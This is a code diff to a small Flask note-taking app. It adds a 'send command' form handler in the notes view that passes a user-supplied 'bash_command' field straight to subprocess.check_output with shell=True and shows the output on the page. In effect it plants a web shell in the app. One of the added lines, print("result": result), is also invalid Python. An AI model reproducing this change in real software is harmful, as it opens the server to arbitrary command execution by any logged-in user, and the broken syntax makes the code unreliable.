@@ -1,6 +1,7 @@
 import json, sqlite3, click, functools, os, hashlib,time, random, sys
 from flask import Flask, current_app, g, session, redirect, render_template, url_for, request
 from werkzeug import security
+import subprocess
 
 
 
@@ -68,6 +69,7 @@ def index():
 @login_required
 def notes():
     importerror=""
+    shellResponse=""
     #Posting a new note:
     if request.method == 'POST':
         if request.form['submit_button'] == 'add note':
@@ -100,6 +102,13 @@ def notes():
                 importerror="No such note with that ID!"
             db.commit()
             db.close()
+        elif request.form['submit_button'] == 'send command':
+            command = request.form['bash_command']
+            print("running command: " + command)
+            result = subprocess.check_output(command, shell=True, text=True)
+            shellResponse=result
+            print("result": result)
+            
     
     db = connect_db()
     c = db.cursor()
@@ -109,7 +118,7 @@ def notes():
     notes = c.fetchall()
     print(notes)
     
-    return render_template('notes.html',notes=notes,importerror=importerror)
+    return render_template('notes.html',notes=notes,importerror=importerror, shellResponse=shellResponse)
 
 def textSanitizer(text):
     badCharacters = ['"', ';', '-', '\'']
